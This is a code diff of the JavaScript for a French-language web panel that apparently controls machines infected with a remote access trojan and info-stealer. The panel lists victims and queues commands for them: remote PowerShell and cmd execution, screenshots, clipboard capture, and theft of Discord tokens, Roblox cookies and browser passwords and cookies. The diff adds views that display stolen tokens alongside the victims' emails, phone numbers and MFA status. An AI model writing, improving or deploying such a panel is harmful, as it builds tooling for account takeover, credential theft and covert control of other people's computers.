@@ -1,18 +1,17 @@
 let currentClient = null;
 let clientsData = [];
+let processingTimer = null;
+let commandStartTime = null;
 
-// Navigation
 document.querySelectorAll('.nav-item').forEach(item => {
     item.addEventListener('click', (e) => {
         e.preventDefault();
         document.querySelectorAll('.nav-item').forEach(nav => nav.classList.remove('active'));
         item.classList.add('active');
-        
         const page = item.dataset.page;
         document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
         document.getElementById(`${page}-page`).classList.add('active');
-        document.getElementById('page-title').innerText = item.querySelector('span:last-child').innerText;
-        
+        document.getElementById('page-title').innerText = item.innerText.trim();
         if (page === 'clients') loadClients();
         if (page === 'activities') loadActivities();
     });
@@ -45,65 +44,74 @@ async function loadClients() {
     } catch(e) { console.error(e); }
 }
 
+function formatBytes(bytes) {
+    if (!bytes || bytes === 0) return '0 B';
+    const k = 1024;
+    const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
+    const i = Math.floor(Math.log(bytes) / Math.log(k));
+    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
+}
+
 function renderClients(clients) {
     const container = document.getElementById('clients-grid');
     if (!clients.length) {
-        container.innerHTML = '<div style="text-align:center;padding:40px;">Aucun client pour le moment</div>';
+        container.innerHTML = '<div class="no-data">Aucun client</div>';
         return;
     }
-    container.innerHTML = clients.map(client => `
-        <div class="client-card ${client.online ? 'online' : 'offline'}">
+    container.innerHTML = clients.map(client => {
+        const diskTotal = client.disk_total || 0;
+        const diskFree = client.disk_free || 0;
+        const diskUsed = diskTotal - diskFree;
+        const ramTotal = client.ram_total || 0;
+        const ramAvailable = client.ram_available || 0;
+        const ramUsed = ramTotal - ramAvailable;
+        return `
+        <div class="client-card ${client.online ? 'online' : 'offline'}" onclick="openCommandModal('${client.machine_id}', '${escapeHtml(client.computer_name || client.machine_id)}')">
             <div class="client-header">
-                <div class="client-name">${escapeHtml(client.computer_name || client.machine_id)}</div>
-                <div class="client-status ${client.online ? 'online' : 'offline'}">${client.online ? '🟢 En ligne' : '⚫ Hors ligne'}</div>
+                <div class="client-name"><i class="fas fa-${client.online?'circle':'circle-o'}"></i> ${escapeHtml(client.computer_name || client.machine_id)}</div>
+                <div class="client-status ${client.online?'online':'offline'}">${client.online?'En ligne':'Hors ligne'}</div>
             </div>
             <div class="client-details">
-                <p>👤 ${escapeHtml(client.username || '?')}</p>
-                <p>💻 ${escapeHtml(client.windows_version || '?')}</p>
-                <p>🌐 ${escapeHtml(client.ip || '?')}</p>
-                <p>📅 Dernière vue: ${formatDate(client.last_seen)}</p>
+                <p><i class="fas fa-user"></i> ${escapeHtml(client.username || '?')}</p>
+                <p><i class="fab fa-windows"></i> ${escapeHtml(client.windows_version || '?')}</p>
+                <p><i class="fas fa-globe"></i> ${escapeHtml(client.ip || '?')}</p>
+                <p><i class="fas fa-hdd"></i> ${formatBytes(diskUsed)} / ${formatBytes(diskTotal)}</p>
+                <p><i class="fas fa-memory"></i> ${formatBytes(ramUsed)} / ${formatBytes(ramTotal)}</p>
+                <p><i class="far fa-clock"></i> ${formatDate(client.last_seen)}</p>
             </div>
-            <div class="client-actions">
-                <button class="btn-small" onclick="openCommandModal('${client.machine_id}', '${escapeHtml(client.computer_name || client.machine_id)}')">⚡ Commande</button>
-                <button class="btn-small" onclick="viewClientHistory('${client.machine_id}')">📜 Historique</button>
-            </div>
-        </div>
-    `).join('');
+        </div>`;
+    }).join('');
 }
 
 function filterClients() {
-    const search = document.getElementById('client-search').value.toLowerCase();
+    const s = document.getElementById('client-search').value.toLowerCase();
     const filtered = clientsData.filter(c => 
-        (c.computer_name && c.computer_name.toLowerCase().includes(search)) ||
-        (c.username && c.username.toLowerCase().includes(search)) ||
-        (c.ip && c.ip.includes(search))
+        (c.computer_name||'').toLowerCase().includes(s) ||
+        (c.username||'').toLowerCase().includes(s) ||
+        (c.ip||'').includes(s)
     );
     renderClients(filtered);
 }
 
-function formatDate(dateStr) {
-    if (!dateStr) return 'Jamais';
+function formatDate(d) {
+    if (!d) return 'Jamais';
     try {
-        const date = new Date(dateStr);
+        const date = new Date(d);
         const now = new Date();
-        const diff = Math.floor((now - date) / 1000 / 60);
+        const diff = Math.floor((now - date) / 60000);
         if (diff < 1) return 'À l\'instant';
         if (diff < 60) return `Il y a ${diff} min`;
         if (diff < 1440) return `Il y a ${Math.floor(diff/60)}h`;
         return date.toLocaleDateString();
-    } catch(e) { return dateStr; }
+    } catch(e) { return d; }
 }
 
 function escapeHtml(str) {
     if (!str) return '';
-    return str.replace(/[&<>]/g, function(m) {
-        if (m === '&') return '&amp;';
-        if (m === '<') return '&lt;';
-        if (m === '>') return '&gt;';
-        return m;
-    });
+    return str.replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'})[m]);
 }
 
+// --- COMMANDE ---
 function openCommandModal(machineId, clientName) {
     currentClient = machineId;
     document.getElementById('modal-client-name').innerText = clientName;
@@ -114,13 +122,10 @@ function openCommandModal(machineId, clientName) {
 
 document.getElementById('command-type').addEventListener('change', function() {
     const paramsGroup = document.getElementById('command-params-group');
-    if (this.value === 'execute_ps' || this.value === 'execute_cmd') {
+    const type = this.value;
+    if (type === 'execute_ps' || type === 'execute_cmd') {
         paramsGroup.style.display = 'block';
-        if (this.value === 'execute_ps') {
-            document.getElementById('command-params').value = 'Get-Process | Select-Object -First 10';
-        } else {
-            document.getElementById('command-params').value = 'dir';
-        }
+        document.getElementById('command-params').value = type === 'execute_ps' ? 'Get-Process | Select-Object -First 10' : 'dir';
     } else {
         paramsGroup.style.display = 'none';
     }
@@ -129,49 +134,59 @@ document.getElementById('command-type').addEventListener('change', function() {
 async function executeCommand() {
     const commandType = document.getElementById('command-type').value;
     let params = {};
-    
     if (commandType === 'execute_ps' || commandType === 'execute_cmd') {
-        const cmd = document.getElementById('command-params').value;
-        if (cmd) params = { command: cmd };
+        params = { command: document.getElementById('command-params').value };
     } else if (commandType === 'kill_process') {
-        const pid = prompt('Entrez le PID du processus à tuer:');
+        const pid = prompt('PID :');
         if (pid) params = { pid: parseInt(pid) };
     }
-    
+    // Enregistrer l'heure d'envoi pour le ping
+    commandStartTime = Date.now();
     try {
         const res = await fetch('/api/send_command', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                machine_id: currentClient,
-                command_type: commandType,
-                params: params
-            })
+            body: JSON.stringify({ machine_id: currentClient, command_type: commandType, params: params })
         });
         const data = await res.json();
-        if (data.status === 'command queued') {
-            alert(`Commande envoyée ! ID: ${data.command_id}`);
+        if (data.command_id) {
             closeModal();
-            // Attendre et récupérer le résultat
-            waitForResult(data.command_id);
+            showProcessing(data.command_id, data.command_type);
         } else {
-            alert('Erreur: ' + (data.error || 'Inconnue'));
+            alert('Erreur : ' + (data.error || 'inconnue'));
         }
     } catch(e) {
-        alert('Erreur: ' + e.message);
+        alert('Erreur réseau');
     }
+}
+
+function showProcessing(commandId, commandType) {
+    document.getElementById('processing-modal').style.display = 'block';
+    let seconds = 0;
+    document.getElementById('processing-timer').innerText = '0s';
+    clearInterval(processingTimer);
+    processingTimer = setInterval(() => {
+        seconds++;
+        document.getElementById('processing-timer').innerText = seconds + 's';
+    }, 1000);
+    waitForResult(commandId);
 }
 
 async function waitForResult(commandId, attempts = 0) {
     if (attempts > 30) {
-        alert('Timeout - Pas de réponse du client');
+        clearInterval(processingTimer);
+        document.getElementById('processing-modal').style.display = 'none';
+        alert('Timeout');
         return;
     }
     try {
         const res = await fetch(`/api/command_result/${commandId}`);
         const data = await res.json();
         if (data.status === 'executed') {
-            showResult(data.result);
+            clearInterval(processingTimer);
+            document.getElementById('processing-modal').style.display = 'none';
+            const pingMs = Date.now() - commandStartTime;
+            showResult(data.result, data.command_type, pingMs);
         } else {
             setTimeout(() => waitForResult(commandId, attempts + 1), 2000);
         }
@@ -180,15 +195,120 @@ async function waitForResult(commandId, attempts = 0) {
     }
 }
 
-function showResult(result) {
+function showResult(result, commandType, pingMs = null) {
     const content = document.getElementById('result-content');
-    if (typeof result === 'string') {
-        content.innerText = result;
-    } else {
-        content.innerText = JSON.stringify(result, null, 2);
+    const title = document.getElementById('result-title');
+    const icons = {
+        ping: 'fa-heartbeat',
+        system_info: 'fa-info-circle',
+        discord_data: 'fab fa-discord',
+        roblox_cookie: 'fa-gamepad',
+        browser_passwords: 'fa-key',
+        browser_cookies: 'fa-cookie-bite',
+        screenshot: 'fa-camera',
+        clipboard: 'fa-copy',
+        list_processes: 'fa-list',
+        execute_ps: 'fa-code',
+        execute_cmd: 'fa-terminal'
+    };
+    title.innerHTML = `<i class="fas ${icons[commandType] || 'fa-check-circle'}"></i> ${commandType}`;
+
+    if (commandType === 'ping') {
+        content.innerHTML = `
+            <div class="card-result ping-result">
+                <i class="fas fa-heartbeat" style="font-size:48px;color:#22c55e;"></i>
+                <p>Ping : <strong>${pingMs} ms</strong></p>
+                <p>${result.timestamp || ''}</p>
+            </div>`;
+    }
+    else if (commandType === 'system_info') {
+        const r = result;
+        const diskUsed = (r.disk?.total||0) - (r.disk?.free||0);
+        const ramUsed = (r.ram?.total||0) - (r.ram?.available||0);
+        content.innerHTML = `
+            <div class="card-result">
+                <h3><i class="fas fa-desktop"></i> ${escapeHtml(r.computer_name)}</h3>
+                <p><i class="fas fa-user"></i> ${escapeHtml(r.username)}</p>
+                <p><i class="fab fa-windows"></i> ${escapeHtml(r.windows_version)}</p>
+                <p><i class="fas fa-globe"></i> ${escapeHtml(r.ip)}</p>
+                <p><i class="fas fa-hdd"></i> ${formatBytes(diskUsed)} / ${formatBytes(r.disk?.total||0)}</p>
+                <p><i class="fas fa-memory"></i> ${formatBytes(ramUsed)} / ${formatBytes(r.ram?.total||0)}</p>
+            </div>`;
+    }
+    else if (commandType === 'discord_data') {
+        if (!result || result.length === 0) return content.innerHTML = '<p>Aucun token trouvé.</p>';
+        let html = '<div class="discord-grid">';
+        result.forEach(tokenInfo => {
+            const avatarUrl = `https://cdn.discordapp.com/avatars/${tokenInfo.user_id}/${tokenInfo.avatar || 'default.png'}?size=128`;
+            html += `
+            <div class="discord-card">
+                <img src="${avatarUrl}" class="discord-avatar" onerror="this.onerror=null;this.src='https://cdn.discordapp.com/embed/avatars/0.png'">
+                <div class="discord-info">
+                    <h3>${escapeHtml(tokenInfo.username)}#${tokenInfo.discriminator}</h3>
+                    <p><i class="fas fa-id-badge"></i> ${tokenInfo.user_id}</p>
+                    <p><i class="fas fa-envelope"></i> ${tokenInfo.email || 'N/A'}</p>
+                    <p><i class="fas fa-phone"></i> ${tokenInfo.phone || 'N/A'}</p>
+                    <p><i class="fas fa-shield-alt"></i> MFA: ${tokenInfo.mfa_enabled ? '✅' : '❌'}</p>
+                    <p><i class="fas fa-server"></i> Guilds: ${tokenInfo.guilds_count}</p>
+                    <p><i class="fas fa-crown"></i> Nitro: ${tokenInfo.has_nitro ? `✅ (expire: ${tokenInfo.nitro_expiry || '?'})` : '❌'}</p>
+                    <p><i class="fas fa-rocket"></i> Boosts: ${tokenInfo.available_boosts}</p>
+                    <div class="token-box">
+                        <code>${escapeHtml(tokenInfo.token)}</code>
+                    </div>
+                </div>
+            </div>`;
+        });
+        html += '</div>';
+        content.innerHTML = html;
+    }
+    else if (commandType === 'roblox_cookie') {
+        if (result && result.cookie) {
+            content.innerHTML = `
+                <div class="card-result">
+                    <h3><i class="fas fa-gamepad"></i> Cookie Roblox</h3>
+                    <p>Utilisateur : ${escapeHtml(result.username || 'Inconnu')}</p>
+                    <div class="token-box"><code>${escapeHtml(result.cookie)}</code></div>
+                </div>`;
+        } else {
+            content.innerHTML = '<p>Aucun cookie Roblox trouvé.</p>';
+        }
+    }
+    else if (commandType === 'screenshot') {
+        if (result && result.length) {
+            let html = '';
+            result.forEach((img, i) => {
+                html += `
+                <div class="screenshot-item" onclick="openLightbox('${img.data}')">
+                    <h3>Moniteur ${img.monitor || (i+1)}</h3>
+                    <img src="data:image/png;base64,${img.data}" class="screenshot-thumb">
+                </div>`;
+            });
+            content.innerHTML = html;
+        } else {
+            content.innerHTML = '<p>Aucune capture.</p>';
+        }
+    }
+    else if (typeof result === 'string') {
+        content.innerHTML = `<pre>${escapeHtml(result)}</pre>`;
+    }
+    else {
+        content.innerHTML = `<pre>${escapeHtml(JSON.stringify(result, null, 2))}</pre>`;
     }
     document.getElementById('result-modal').style.display = 'block';
 }
+
+function openLightbox(base64data) {
+    const lb = document.getElementById('lightbox-modal');
+    document.getElementById('lightbox-img').src = 'data:image/png;base64,' + base64data;
+    lb.style.display = 'block';
+}
+
+function closeLightbox() {
+    document.getElementById('lightbox-modal').style.display = 'none';
+}
+
+document.getElementById('lightbox-modal').addEventListener('click', closeLightbox);
+document.getElementById('lightbox-img').addEventListener('click', (e) => e.stopPropagation());
 
 function closeModal() {
     document.getElementById('command-modal').style.display = 'none';
@@ -198,99 +318,60 @@ function closeResultModal() {
     document.getElementById('result-modal').style.display = 'none';
 }
 
-async function viewClientHistory(machineId) {
-    try {
-        const res = await fetch(`/api/commands/history/${machineId}`);
-        const commands = await res.json();
-        const client = clientsData.find(c => c.machine_id === machineId);
-        const clientName = client ? (client.computer_name || machineId) : machineId;
-        if (!commands.length) {
-            alert(`Aucune commande historique pour ${clientName}`);
-            return;
-        }
-        let text = `Historique des commandes - ${clientName}\n${'='.repeat(50)}\n\n`;
-        for (const cmd of commands) {
-            text += `ID: ${cmd.id}\n`;
-            text += `Type: ${cmd.command_type}\n`;
-            text += `Status: ${cmd.status}\n`;
-            text += `Créée: ${cmd.created_at}\n`;
-            if (cmd.executed_at) text += `Exécutée: ${cmd.executed_at}\n`;
-            if (cmd.result) text += `Résultat: ${JSON.stringify(cmd.result, null, 2)}\n`;
-            text += `${'-'.repeat(40)}\n\n`;
-        }
-        const content = document.getElementById('result-content');
-        content.innerText = text;
-        document.getElementById('result-modal').style.display = 'block';
-    } catch(e) {
-        alert('Erreur: ' + e.message);
-    }
-}
+window.onclick = function(event) {
+    if (event.target === document.getElementById('command-modal')) closeModal();
+    if (event.target === document.getElementById('result-modal')) closeResultModal();
+};
 
+// Activités
 async function loadRecentActivities() {
     try {
         const res = await fetch('/api/activities');
-        const activities = await res.json();
+        const acts = await res.json();
         const container = document.getElementById('recent-activities');
-        if (!activities.length) {
-            container.innerHTML = '<div class="activity-item">Aucune activité</div>';
-            return;
-        }
-        container.innerHTML = activities.slice(0, 10).map(act => `
+        if (!acts.length) return container.innerHTML = '<div class="activity-item">Aucune activité</div>';
+        container.innerHTML = acts.slice(0,10).map(act => `
             <div class="activity-item">
-                <div class="activity-icon">${getActivityIcon(act.action)}</div>
+                <i class="fas ${getActivityIcon(act.action)} activity-icon"></i>
                 <div class="activity-content">
-                    <div class="activity-action">${escapeHtml(act.action)}</div>
-                    ${act.details ? `<div class="activity-details">${escapeHtml(act.details)}</div>` : ''}
+                    <span>${escapeHtml(act.action)}</span>
+                    ${act.details ? `<small>${escapeHtml(act.details)}</small>` : ''}
                 </div>
-                <div class="activity-time">${formatDate(act.timestamp)}</div>
-            </div>
-        `).join('');
-    } catch(e) { console.error(e); }
+                <span class="activity-time">${formatDate(act.timestamp)}</span>
+            </div>`).join('');
+    } catch(e) {}
 }
 
 async function loadActivities() {
     try {
         const res = await fetch('/api/activities');
-        const activities = await res.json();
+        const acts = await res.json();
         const container = document.getElementById('activities-full');
-        if (!activities.length) {
-            container.innerHTML = '<div class="activity-item">Aucune activité</div>';
-            return;
-        }
-        container.innerHTML = activities.map(act => `
+        if (!acts.length) return container.innerHTML = '<div class="activity-item">Aucune</div>';
+        container.innerHTML = acts.map(act => `
             <div class="activity-item">
-                <div class="activity-icon">${getActivityIcon(act.action)}</div>
+                <i class="fas ${getActivityIcon(act.action)} activity-icon"></i>
                 <div class="activity-content">
-                    <div class="activity-action">${escapeHtml(act.action)}</div>
-                    ${act.machine_id ? `<div class="activity-details">Machine: ${escapeHtml(act.machine_id)}</div>` : ''}
-                    ${act.details ? `<div class="activity-details">${escapeHtml(act.details)}</div>` : ''}
+                    <span>${escapeHtml(act.action)}</span>
+                    ${act.machine_id ? `<small>${escapeHtml(act.machine_id)}</small>` : ''}
+                    ${act.details ? `<small>${escapeHtml(act.details)}</small>` : ''}
                 </div>
-                <div class="activity-time">${formatDate(act.timestamp)}</div>
-            </div>
-        `).join('');
-    } catch(e) { console.error(e); }
+                <span class="activity-time">${formatDate(act.timestamp)}</span>
+            </div>`).join('');
+    } catch(e) {}
 }
 
 function getActivityIcon(action) {
-    const icons = {
-        'heartbeat': '💓',
-        'send_command': '⚡',
-        'command_result': '✅',
-        'login': '🔐',
-        'logout': '🚪'
+    const map = {
+        'heartbeat': 'fa-heartbeat',
+        'send_command': 'fa-bolt',
+        'command_result': 'fa-check-circle',
+        'login': 'fa-sign-in-alt',
+        'logout': 'fa-sign-out-alt'
     };
-    return icons[action] || '📌';
+    return map[action] || 'fa-circle';
 }
 
-// Fermer modals en cliquant en dehors
-window.onclick = function(event) {
-    const modal = document.getElementById('command-modal');
-    const resultModal = document.getElementById('result-modal');
-    if (event.target === modal) closeModal();
-    if (event.target === resultModal) closeResultModal();
-}
-
-// Initialisation
 loadStats();
 loadRecentActivities();
 setInterval(() => {
